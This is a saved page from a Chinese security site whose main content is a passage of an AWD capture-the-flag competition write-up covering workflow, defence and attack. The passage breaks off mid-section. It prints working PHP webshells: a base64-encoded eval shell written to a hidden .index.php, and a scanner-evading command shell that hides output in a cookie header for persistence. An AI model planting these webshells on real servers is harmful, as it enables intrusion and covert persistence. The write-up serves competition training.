</div><div class="_53" style="display: none;"> 本文翻译自 <a href="https://www.anquanke.com/post/id/245158" target="_blank">原文链接</a>。如若转载请注明出处。 </div><div class="_206" style="display: none;"> 商务合作，文章发布请联系 anquanke@360.cn </div><div class="_59"><p> 本文由<b>Ocean</b>原创发布 </p><p> 转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/245158" target="_blank">https://www.anquanke.com/post/id/245158</a></p><p>安全客 - 有思想的安全新媒体</p></div><div class="_62" style="display: none;"><p> 本文转载自: <a href="https://www.anquanke.com/post/id/245158"></a></p><p> 如若转载,请注明出处： <a href="https://www.anquanke.com/post/id/245158" target="_blank"></a></p><p>安全客 - 有思想的安全新媒体</p></div><div class="_63 share1"><div class="main-w"><div class="bg"></div><div class="main"><span>分享到：</span><img class="icon" data-cmd="weixin" alt="微信" src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t01e29062a5dcd13c10.png"></div></div><div class="qrcode" title="https://anquanke.com/post/id/245158" style="display: none;"><canvas width="90" height="90" style="display: none;"></canvas><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFoAAABaCAYAAAA4qEECAAAAAXNSR0IArs4c6QAABJJJREFUeF7tndFy2zAMBOX//2h3rNRTkQpOC4KU2+b62NCktASOB0hxHtu2PbfJ/57PP1M+Ho9w9uO47CWoebNz0evNznsc/6Jg0DAwDLpC4BVpd4OelcqVeRSzSC6i9Y7j+zHRz9RnMvvZX2sjHRVAsy7QoC+206BbQDiiyakeaRv5/37fyHrRXhPp6D9LPpPVbjU+lA5y4wQojXSynkFv21Y9XAxaaHM2olX60si/OvnpPNnAIIHw10iHQf8mMEv86TwkI64iWB2qyq7+qIgmhxuVgvdcJMVfY/9r10GjsxLpBk0pi94DqVz/OdAJLvtQkuI9hEr6knOAjOllhNwHYYMrQzJZ02899J0JwKpOEohkjEFfOCECkYz5COhsFFddQ8VikQOz2iadxWOX1jufsFR7wrM2Rp0p9DDNboJB3/WE5Uk8U3b7gvHKdZBoPU5LD1wib5NuT07zMOg7MG+bQd/DOX8YkpQljoDeHzmciI0baTBFdQKRI1mwkJs36JgS7kcbNOvqlSOaRGt2EbXLNxqephejqsFKsCmpQe91VHTSoL/wG3TXeXREEwJiDC2WyDJE8k6ugxQskXRUbRW5qUj3yNqkksxeQz+esNmlw6BrqA2640fSfQT5EGjyoVmPemgKEjtJABHnpObJbpTUaINmVd/IxjYabdALQUdPWEiqkI1R1VKl+XSHFMzqkZ8KlqwdMug2A2SH0BEdy8XUiD76aOIoyBhSZOzpFPwOIpGUynW81iYNtIp8nlyVQbdIqhsY5UfoOlbsuHrdIDofSPqORN6K+1O2rwSa+MmRIqACd6YbIdFN1zNoUaobNDzMRjKOHMSqNgg1etYrYdm2JT35s9od3qj4lgXST8lG9+k8MmhWdhu0kJGRFK9kkNqMsPGf3UGSftL+gBfZiSyMSBhpPVSKq704i56wGHRcyIxEvUELe0ekh7qUEmiSyiQtT32BZA9kRLayGZuVpJPrqEiHQTPHUtZog06APvpo0mjJHgS0F5BN/7ILAAVMtlmFG/8G3W63QRcfGuyaeXdErzgMs9rd9z2IIyDWSxVI5GfEutFrXWLvDPpMwKBFaDuiOzhEb4lU9GOWgc5e8NQLWXA4jcCtfEbau+gpOFnQoLkdRO/ekWKi8kB1ld0iwTJzDI7omYu+55LN8KAHTSSsWkxQW/bdfYxwQm/8j0xs0C01g174KKwpqmY9nI2aTTQbVsgFXTt7qEf3KmXSoOOvnifNfrJJ+2Fv0B8ATU5y0seg7dbKelQWKtfbaGzy8Zp8gaZy48Qu9TpcWc+gE+/FGfRAY5xENI1CUmXSud7jTqkMeivZilg5r+Xf8Z8F0pfj5OQnaxj0N5Qc0R0U4iFpr2NmmpIIjxxFNoOow1ouHQb9taUGDf+0Cck45btvBU1TmkgSKSakCwCvCRMnRc8Tg4a+n2ix0neD/jRomubvcTSFRlqMV2tkr1V59Yok4TZppSQ2aP0HJdD33pGIMegEaAKUjKGugWwOmYu4g/66q6/9fscBSweBSMYQOLSnQeYy6Is/hOOIJmErxpAo/GkR/Qv4UNDmSLYExAAAAABJRU5ErkJggg==" style="display: block;"></div></div><ul class="_65"><li><a target="_blank" href="https://www.anquanke.com/tag/CTF">CTF</a></li><li><a target="_blank" href="https://www.anquanke.com/tag/AWD">AWD</a></li></ul><div class="_56"><div class="line line1"><div class="_18 item1"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">22赞</span></div><div class="_12 item1"><i class=""></i><span>收藏</span></div></div><div class="line line2"><div class="user"><img class="avatar" src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t018554a95f0f0a50be.png"><span class="name">Ocean</span><span class="label label-"></span></div><div class="_63 share2"><div class="main-w"><div class="bg"></div><div class="main"><span>分享到：</span><img class="icon" data-cmd="weixin" alt="微信" src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t01e29062a5dcd13c10.png"></div></div><div class="qrcode" title="https://anquanke.com/post/id/245158" style="display: none;"><canvas width="90" height="90" style="display: none;"></canvas><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFoAAABaCAYAAAA4qEECAAAAAXNSR0IArs4c6QAABJJJREFUeF7tndFy2zAMBOX//2h3rNRTkQpOC4KU2+b62NCktASOB0hxHtu2PbfJ/57PP1M+Ho9w9uO47CWoebNz0evNznsc/6Jg0DAwDLpC4BVpd4OelcqVeRSzSC6i9Y7j+zHRz9RnMvvZX2sjHRVAsy7QoC+206BbQDiiyakeaRv5/37fyHrRXhPp6D9LPpPVbjU+lA5y4wQojXSynkFv21Y9XAxaaHM2olX60si/OvnpPNnAIIHw10iHQf8mMEv86TwkI64iWB2qyq7+qIgmhxuVgvdcJMVfY/9r10GjsxLpBk0pi94DqVz/OdAJLvtQkuI9hEr6knOAjOllhNwHYYMrQzJZ02899J0JwKpOEohkjEFfOCECkYz5COhsFFddQ8VikQOz2iadxWOX1jufsFR7wrM2Rp0p9DDNboJB3/WE5Uk8U3b7gvHKdZBoPU5LD1wib5NuT07zMOg7MG+bQd/DOX8YkpQljoDeHzmciI0baTBFdQKRI1mwkJs36JgS7kcbNOvqlSOaRGt2EbXLNxqephejqsFKsCmpQe91VHTSoL/wG3TXeXREEwJiDC2WyDJE8k6ugxQskXRUbRW5qUj3yNqkksxeQz+esNmlw6BrqA2640fSfQT5EGjyoVmPemgKEjtJABHnpObJbpTUaINmVd/IxjYabdALQUdPWEiqkI1R1VKl+XSHFMzqkZ8KlqwdMug2A2SH0BEdy8XUiD76aOIoyBhSZOzpFPwOIpGUynW81iYNtIp8nlyVQbdIqhsY5UfoOlbsuHrdIDofSPqORN6K+1O2rwSa+MmRIqACd6YbIdFN1zNoUaobNDzMRjKOHMSqNgg1etYrYdm2JT35s9od3qj4lgXST8lG9+k8MmhWdhu0kJGRFK9kkNqMsPGf3UGSftL+gBfZiSyMSBhpPVSKq704i56wGHRcyIxEvUELe0ekh7qUEmiSyiQtT32BZA9kRLayGZuVpJPrqEiHQTPHUtZog06APvpo0mjJHgS0F5BN/7ILAAVMtlmFG/8G3W63QRcfGuyaeXdErzgMs9rd9z2IIyDWSxVI5GfEutFrXWLvDPpMwKBFaDuiOzhEb4lU9GOWgc5e8NQLWXA4jcCtfEbau+gpOFnQoLkdRO/ekWKi8kB1ld0iwTJzDI7omYu+55LN8KAHTSSsWkxQW/bdfYxwQm/8j0xs0C01g174KKwpqmY9nI2aTTQbVsgFXTt7qEf3KmXSoOOvnifNfrJJ+2Fv0B8ATU5y0seg7dbKelQWKtfbaGzy8Zp8gaZy48Qu9TpcWc+gE+/FGfRAY5xENI1CUmXSud7jTqkMeivZilg5r+Xf8Z8F0pfj5OQnaxj0N5Qc0R0U4iFpr2NmmpIIjxxFNoOow1ouHQb9taUGDf+0Cck45btvBU1TmkgSKSakCwCvCRMnRc8Tg4a+n2ix0neD/jRomubvcTSFRlqMV2tkr1V59Yok4TZppSQ2aP0HJdD33pGIMegEaAKUjKGugWwOmYu4g/66q6/9fscBSweBSMYQOLSnQeYy6Is/hOOIJmErxpAo/GkR/Qv4UNDmSLYExAAAAABJRU5ErkJggg==" style="display: block;"></div></div></div></div></div><div class="_60"><h2 class="g-title">推荐阅读</h2><ul><li><a href="https://www.anquanke.com/post/id/289260"><img src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t01ecfc10734bb0a594.jpg"><h5 class="g-line2">RBAC 和 Keto（Go RBAC 框架）</h5><p>2023-06-16 18:31:25</p></a></li><li><a href="https://www.anquanke.com/post/id/289299"><img src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t01631accaaecf8e083.jpg"><h5 class="g-line2">API NEWS | Booking.com爆出API漏洞</h5><p>2023-06-16 17:57:51</p></a></li><li><a href="https://www.anquanke.com/post/id/289298"><img src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t010bea9d3bd19acbe5.jpg"><h5 class="g-line2">RBAC 和 Keto（Go RBAC 框架）</h5><p>2023-06-16 17:57:09</p></a></li><li><a href="https://www.anquanke.com/post/id/289234"><img src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t01541abcaaa3b796e4.jpg"><h5 class="g-line2">案例分享 | 银行API安全解决方案</h5><p>2023-06-16 17:56:08</p></a></li></ul></div><div class="_7 index-comment"><h2 class="g-title">发表评论</h2><div class="login"><p class="login-text">您还未登录，请先登录。</p><p class="login-bar"><a href="https://www.anquanke.com/login/index.html">登录</a></p></div><h2 class="g-title">评论列表</h2><ul class="body"><li class="body-item"><a href="https://www.anquanke.com/member.html?memberId=150005" class="body-item-avatar"><img src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t018554a95f0f0a50be.png"></a><div class="item-main"><div class="item-main-top"><a href="https://www.anquanke.com/member.html?memberId=150005" class="item-main-name">Ocean</a><span class="item-main-time">2021-07-01 09:55</span><div class="_18 rate"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">7赞</span></div><button>回复</button></div><div class="item-main-content">这次比赛三个web，全是mvc，其中两个think PHP，不会的挺难受的，学习php和tp，推荐开源电商系统likeshop，项目地址https://gitee-github.com/xRbKstf2</div><!----><div class="body-item-sub"></div></div></li><li class="body-item"><a href="https://www.anquanke.com/member.html?memberId=150005" class="body-item-avatar"><img src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t018554a95f0f0a50be.png"></a><div class="item-main"><div class="item-main-top"><a href="https://www.anquanke.com/member.html?memberId=150005" class="item-main-name">Ocean</a><span class="item-main-time">2021-06-30 10:26</span><div class="_18 rate"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">11赞</span></div><button>回复</button></div><div class="item-main-content">有误的地方，还请大佬们指教，有更多骚操作求分享。</div><!----><div class="body-item-sub"></div></div></li></ul><!----></div></div><div class="index-side"><div class="index-side-top"><div class="_66"><img class="banner" src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t014757b72460d855bf.png"><div class="w"><a class="avatar" href="https://www.anquanke.com/member.html?memberId=150005"><img src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t018554a95f0f0a50be.png"></a><p class="info"><a href="https://www.anquanke.com/member.html?memberId=150005" class="name">Ocean</a><a href="https://www.anquanke.com/member.html?memberId=150005" class="user-label user-label-"></a></p><p class="hint">知其黑，守其白，博客地址：oceansec.blog.csdn.net</p><div class="bottom"><ul class="bottom-1"><li>文章</li><li><strong>2</strong></li></ul><ul class="bottom-2"><li>粉丝</li><li><strong>3</strong></li></ul><div class="spacer"></div><!----></div></div></div><div class="_64"><h3 class="title"> TA的文章</h3><ul><li><h5><a href="https://www.anquanke.com/post/id/259244">对着登录框一顿暴捶</a></h5><p>2021-11-23 15:30:53</p></li><li><h5><a href="https://www.anquanke.com/post/id/245158">国赛分区赛awd赛后总结-安心做awd混子</a></h5><p>2021-06-30 10:00:01</p></li></ul></div><div class="_61"><h3 class="title"> 相关文章</h3><ul><li><h5><a href="https://www.anquanke.com/post/id/288353">培养云上安全人才 | 阿里云2023首届CTF大赛重磅启动</a></h5><p>2023-04-24 19:17:46</p></li><li><h5><a href="https://www.anquanke.com/post/id/286967">Ichunqiu云境 —— Exchange Writeup</a></h5><p>2023-03-03 14:30:36</p></li><li><h5><a href="https://www.anquanke.com/post/id/284201">Ichunqiu云境 - Delegation Writeup</a></h5><p>2023-01-06 10:30:50</p></li><li><h5><a href="https://www.anquanke.com/post/id/284260">Ichunqiu云境 —— Tsclient Writeup</a></h5><p>2023-01-05 10:30:31</p></li><li><h5><a href="https://www.anquanke.com/post/id/284307">活动 | 长亭科技2023第五届 Real World CTF 战火已燃，等你来战！</a></h5><p>2022-12-21 17:00:34</p></li><li><h5><a href="https://www.anquanke.com/post/id/283073">从一道题入门 UEFI PWN</a></h5><p>2022-11-11 15:30:05</p></li><li><h5><a href="https://www.anquanke.com/post/id/282335">2022年工业信息安全技能大赛“望岳杯”锦标赛 wp</a></h5><p>2022-10-31 15:30:36</p></li></ul></div><div class="_52"><h3 class="title">热门推荐</h3><ul></ul></div></div><div class="_57 m-catalog-fixed"><div class="m-catalog-fixed wrap"><div class="title">文章目录</div><ul class="list"><li class="item"><a class="g-line1 on" target="_self" href="https://www.anquanke.com/post/id/245158#h2-0">一般流程</a><ul><li class="subitem"><a class="g-line1 on" href="https://www.anquanke.com/post/id/245158#h3-1">1.登录比赛平台，查看比赛信息</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-2">2.dump源码</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-3">3.站点防御部署</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-4">4.利用漏洞进行得分</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-5">5.编写脚本批量拿分</a></li></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/245158#h2-6">攻击</a><ul><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-7">服务发现</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-8">漏洞利用</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-9">权限维持</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-10">批量脚本</a></li></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/245158#h2-11">防御</a><ul><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-12">实用命令</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-13">部署waf</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-14">克制不死马</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-15">干掉反弹shell</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-16">改密码</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-17">文件监控</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-18">常用linux命令</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-19">流量监控</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-20">wireshark</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-21">apache2日志</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-22">awd中linux的命令</a></li></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/245158#h2-23">两个awd神器</a><ul><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-24">AoiAWD</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/245158#h3-25">watchbird</a></li></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/245158#h2-26">Fix</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/245158#h2-27">优秀文章</a><ul></ul></li></ul></div></div></div></div><div class="_8"><div class="g-w main"><div class="col1"><p class="col1-logo"><img src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t018717b31ed82fff86.png"></p><div class="col1-link"><b class="col1-weixin"></b><a href="https://weibo.com/360adlab" class="col1-sina"></a><a href="https://zhuanlan.zhihu.com/c_118578260" class="col1-zhi"></a></div></div><div class="col2"><div class="title">安全客</div><ul class="col2-list"><li><a href="https://www.anquanke.com/about" rel="noopener noreferrer" target="_blank">关于我们</a></li><li><a href="https://www.anquanke.com/note/contact" target="_blank" rel="noopener noreferrer">联系我们</a></li><li><a href="https://www.anquanke.com/note/protocol" target="_blank" rel="noopener noreferrer">用户协议</a></li></ul></div><div class="col3"><div class="title">商务合作</div><ul class="col3-list"><li><a href="https://www.anquanke.com/note/business" target="_blank" rel="noopener noreferrer">合作内容</a></li><li><a href="https://www.anquanke.com/note/contact" target="_blank" rel="noopener noreferrer">联系方式</a></li><li><a href="https://www.anquanke.com/link" target="_blank" rel="noopener noreferrer">友情链接</a></li></ul></div><div class="col4"><div class="title">内容需知</div><ul><li><a href="https://www.anquanke.com/contribute/tips" target="_blank" rel="noopener noreferrer">投稿须知</a></li><li><a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener noreferrer">转载须知</a></li><li>官网QQ群8：819797106</li><li>官网QQ群3：830462644(已满)</li><li>官网QQ群2：814450983(已满)</li><li>官网QQ群1：702511263(已满)</li></ul></div><div class="col5"><div class="title">合作单位</div><ul><li><a href="http://www.cert.org.cn/" target="_blank" rel="noopener noreferrer"><img alt="安全客" src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t01592a959354157bc0.png" style="max-height: 40px;"></a></li><li style="margin-top: -20px;"><a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener noreferrer"><img alt="安全客" src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t014f76fcea94035e47.png" style="max-height: 50px; margin-top: 10px;"></a></li></ul></div></div><div class="right g-w"><span>Copyright © 北京奇虎科技有限公司 360网络攻防实验室 安全客 All Rights Reserved </span><a href="https://beian.miit.gov.cn/">京ICP备08010314号-66</a><span id="cnzz_stat_icon_1271278035"><a href="https://www.cnzz.com/stat/website.php?web_id=1271278035" target="_blank" title="站长统计"><img border="0" hspace="0" vspace="0" src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/pic.gif" ij8vlrxwy=""></a></span></div><div class="layer" style="display: none;"><div class="layer-main"><div class="layer-title">微信二维码</div><b class="layer-close">X</b><img src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t0151209205b47f2270.jpg" alt="安全客"></div></div></div></div><script>window.__state__={"artical":{"post":{"id":245158,"title":"国赛分区赛awd赛后总结-安心做awd混子","category_name":"安全知识","category_slug":"knowledge","desc":"最近参加了国赛分区赛，我所在的分区正好是awd赛制，所以总结了下关于awd的基操，方便新手入门。","date":"2021-06-30 10:00:01","time_interval":"2021-06-30","status":"publish","comment":2,"cover":"https://p5.ssl.qhimg.com/t014b09264c422ce958.jpg","subject":false,"red":false,"type":"origin","url":"","source":"","fee":"400","origin_author":"","pv":307546,"like_count":22,"liked":0,"tags":["CTF","AWD"],"is_favorite":false,"favorite_count":18,"content":"<html>\n<head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"></head>\n<body>\n<p><img class=\"alignnone size-full wp-image-245419 aligncenter\" alt=\"\" width=\"718\" height=\"373\" data-original=\"https://p5.ssl.qhimg.com/t014b09264c422ce958.jpg\"></p>\n<p> </p>\n<p>最近参加了国赛分区赛，我所在的分区正好是awd赛制，所以总结了下关于awd的基操，方便新手入门</p>\n<p>简单来说就是三步</p>\n<ol>\n<li>登录平台，查看规则，探索flag提交方式，比赛开始前有时间的话使用nmap或者httpscan等工具扫一下IP段，整理各队的IP（靶机的IP应该是比赛开始后才会给出）</li>\n<li>登录ssh-&gt;dump源码-&gt;D盾去后门-&gt;一人写批量脚本，一个人去修-&gt;部署waf，流量监控</li>\n<li>控制npc-&gt;加固npc（拿到别人的靶机也是一样），紧盯流量</li>\n</ol>\n<p>下面来详细介绍具体流程</p>\n<p> </p>\n<h2 name=\"h2-0\" id=\"h2-0\">一般流程</h2>\n<h3 name=\"h3-1\" id=\"h3-1\">\n<a class=\"reference-link\" name=\"1.%E7%99%BB%E5%BD%95%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%AF%94%E8%B5%9B%E4%BF%A1%E6%81%AF\"></a>1.登录比赛平台，查看比赛信息</h3>\n<p>这此国赛主办方没有ssh密码，而是提供rsa公私钥，使用ssh-key方式进行登录</p>\n<p>连接方法和密码方式相似，只不过是选择密钥而不用输入密码</p>\n<p><img class=\"alignnone size-full wp-image-245401 aligncenter\" alt=\"\" width=\"539\" height=\"481\" data-original=\"https://p4.ssl.qhimg.com/t01e89d21af07f727b4.png\"></p>\n<p>如果主办方平台给的密码较为简单存在弱口令或者可能被爆破成功的机会，尽快修改密码，密码主要是三个方面</p>\n<ul>\n<li>linux修改ssh即本地密码passwd</li>\n<li>修改后台登录密码mysql -u root -pshow databases；use test;show tables;\n<p>select * from admin;</p>\n<p>updata admin set user pass=’123456’; //updata 表名 set 字段名 = ‘值’;</p>\n<p>flush privileges;</p>\n</li>\n<li>修改mysql登录密码方法一：mysql&gt;set password for root<a class=\"at-link\" title=\"@localhost\" href=\"https://github.com/localhost\">@localhost</a> =password(‘ocean888’);config.php文件中是有数据库的连接信息，执行完上条命令后<strong>更改</strong>此文件方法二：\n<p>mysqladmin -uroot -p 123456 password 123</p>\n<p>root=用户名； 123456=旧密码； 123=新密码；</p>\n</li>\n</ul>\n<h3 name=\"h3-2\" id=\"h3-2\">\n<a class=\"reference-link\" name=\"2.dump%E6%BA%90%E7%A0%81\"></a>2.dump源码</h3>\n<p>使用ssh工具保留源码，复制两份，用d盾去扫一份</p>\n<p>注意：如果使用tar命令打包文件夹，.index.php（隐藏类型文件）将不会被打包</p>\n<p>或者使用scp命令，后续会详细介绍使用方法</p>\n<h4 id=\"h4-u6570u636Eu5E93u64CDu4F5C\">\n<a class=\"reference-link\" name=\"%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C\"></a>数据库操作</h4>\n<p><strong>数据库备份</strong></p>\n<p>登录数据库，命令备份数据库</p>\n<ul>\n<li>mysqldump -u db_user -p db_passwd db_name &gt; 1.sql //备份指定数据库</li>\n<li>cd /var/lib/mysqlmysqldump -u db_user -p db_passwd &gt; 1.sql //先进入数据库目录再备份</li>\n<li>mysqldump —all-databases &gt; 1.sql //备份所有数据库</li>\n</ul>\n<p><strong>数据库还原</strong></p>\n<ul>\n<li>mysql -u db_user -p db_passwd db_name &lt; 1.sql //还原指定数据库</li>\n<li>cd /var/lib/mysqlmysql -u db_user db_passwd &lt; 1.sql //先进入数据库目录再还原</li>\n</ul>\n<h3 name=\"h3-3\" id=\"h3-3\">\n<a class=\"reference-link\" name=\"3.%E7%AB%99%E7%82%B9%E9%98%B2%E5%BE%A1%E9%83%A8%E7%BD%B2\"></a>3.站点防御部署</h3>\n<h4 id=\"h4-check-\">\n<a class=\"reference-link\" name=\"check%EF%BC%9A\"></a>check：</h4>\n<ol>\n<li>查看是否留有后门账户</li>\n<li>关注是否运行了“特殊”进程</li>\n<li>是否使用命令匹配一句话</li>\n<li>关闭不必要端口，如远程登陆端口，木马端口</li>\n</ol>\n<h4 id=\"h4-action-\">\n<a class=\"reference-link\" name=\"action%EF%BC%9A\"></a>action：</h4>\n<ol>\n<li>d盾扫描删除预留后门文件，代码审计工具审计</li>\n<li>流量监控脚本部署</li>\n<li>WAF脚本部署<strong>挂waf：</strong>\n<ul>\n<li>每个文件前边加 require_once(waf.php);</li>\n<li>改 .user.ini配置文件 auto_prepend_file=&lt;filename&gt;; 包含在文件头auto_append_file=&lt;filename&gt;; 包含在文件尾</li>\n</ul>\n<p>注：如果挂了waf出现持续扣分，waf去掉</p>\n</li>\n<li>文件监控脚本部署<strong>注意：</strong>现上好waf再上文件监控靶机没有python的话要先安python（视情况而定）</li>\n</ol>\n<h3 name=\"h3-4\" id=\"h3-4\">\n<a class=\"reference-link\" name=\"4.%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E5%BE%97%E5%88%86\"></a>4.利用漏洞进行得分</h3>\n<p>利用漏洞进行既包括自己去审计挖掘漏洞，也包括看流量分析出其他师傅发现的漏洞的复现</p>\n<h3 name=\"h3-5\" id=\"h3-5\">\n<a class=\"reference-link\" name=\"5.%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC%E6%89%B9%E9%87%8F%E6%8B%BF%E5%88%86\"></a>5.编写脚本批量拿分</h3>\n<ol>\n<li>通过预留后门批量拿分</li>\n<li>批量修改ssh账号密码</li>\n<li>通过脚本批量获取flag</li>\n<li>脚本批量提交flag</li>\n</ol>\n<p>以上就是简单来说awd开局需要做的5件事，一下从攻击和防御两个方面来具体介绍awd玩法</p>\n<p> </p>\n<h2 name=\"h2-6\" id=\"h2-6\">攻击</h2>\n<h3 name=\"h3-7\" id=\"h3-7\">\n<a class=\"reference-link\" name=\"%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0\"></a>服务发现</h3>\n<p>使用nmap对c段或端口进行扫描（看主办方给的靶机情况而定）</p>\n<h4 id=\"h4-nmap\">\n<a class=\"reference-link\" name=\"nmap\"></a>nmap</h4>\n<ul>\n<li>知道IP地址扫端口\n<pre><code>.\\nmap 10.241.180.159 -p1-65535\r\n</code></pre>\n</li>\n<li>扫C段\n<pre><code>.\\nmap 10.241.180.159/24\r\n</code></pre>\n</li>\n<li>根据ip列表扫，有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机\n<pre><code>nmap -iL ip.txt\r\n</code></pre>\n</li>\n</ul>\n<p>nmap扫描完毕后，win按住alt键</p>\n<p><img class=\"alignnone size-full wp-image-245402 aligncenter\" alt=\"\" width=\"563\" height=\"638\" data-original=\"https://p0.ssl.qhimg.com/t01d10881e9d5c1df6f.png\"></p>\n<p>只提取端口</p>\n<h3 name=\"h3-8\" id=\"h3-8\">\n<a class=\"reference-link\" name=\"%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\"></a>漏洞利用</h3>\n<p>awd中存在较多的主要是以下几种漏洞</p>\n<ul>\n<li>命令执行，直接cat /flag，尽量混淆流量也可以通过命令执行执行上传一句话木马，直接用py脚本批量传，美哉</li>\n</ul>\n<pre><code class=\"lang-bash\">echo PD9waHAgZXZhbCgkX1JFUVVFU1RbJzEnXSk7ID8+Cg==|base64 -d&gt;&gt;.index.php\r\n\r\n# &lt;?php eval($_REQUEST['1']); ?&gt;\r\n</code></pre>\n<ul>\n<li>文件读取，直接读取或者是伪协议方式读取flag</li>\n<li>sql注入，数据库中有flag，或者sql注入写shell</li>\n<li>文件上传，绕过黑白名单上传一句话，小马拉大马或者不死马</li>\n<li>awd时间一般较短，所以漏洞不会太深，比较容易发现，有的会直接放几个明显的后门，考验选手们的手速</li>\n</ul>\n<h3 name=\"h3-9\" id=\"h3-9\">\n<a class=\"reference-link\" name=\"%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81\"></a>权限维持</h3>\n<h4 id=\"h4-u8FC7u76FEu4E00u53E5u8BDD\">\n<a class=\"reference-link\" name=\"%E8%BF%87%E7%9B%BE%E4%B8%80%E5%8F%A5%E8%AF%9D\"></a>过盾一句话</h4>\n<pre><code class=\"lang-php\">&lt;?php $a=1;$b=\"a=\".$_GET['a'];parse_str($b);print_r(`$a`)?&gt;\r\n</code></pre>\n<p>可以改造成header返回的马，可以把这个一句话木马放到index.php中，直接访问index.php，从header中拿到flag，既不容易被发现马，又不容易被其他队利用</p>\n<pre><code class=\"lang-php\">&lt;?php $a=1;$b=\"a=\".$_GET['a'];parse_str($b);$k=(`$a`);header('cookie:'.$k);?&gt;\r\n\r\n$a=1;$b=\"a=\".$_GET['a'];parse_str($b);$k=(`$a`);header('cookie:'.$k);\r\n</code></pre>\n<h4 id=\"h4-u4E0Du6B7Bu9A6C\">\n<a class=\"reference-link\" name=\"%E4%B8%8D%E6%AD%BB%E9%A9%AC\"></a>不死马</h4>\n<ul>\n<li>php file_put_contents写入不死马</li>\n</ul>\n<pre><code 